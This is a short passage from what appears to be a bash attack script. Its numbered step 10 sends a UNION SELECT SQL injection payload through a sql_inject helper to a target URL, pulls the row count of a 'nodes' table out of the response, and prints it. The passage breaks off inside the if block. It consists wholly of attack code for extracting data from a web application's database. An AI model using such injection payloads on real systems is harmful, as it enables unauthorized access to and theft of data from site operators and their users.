# 10. Get node count
NODE_COUNT=$(sql_inject "$TARGET_URL" " UNION SELECT 1,COUNT(*),3,4,5,6,7,8,9,10 FROM nodes--" | grep -oE '[0-9]+' | head -1)

if [ -n "$NODE_COUNT" ]; then
    echo -e "${GREEN}✅ Total Nodes: $NODE_COUNT${NC}"
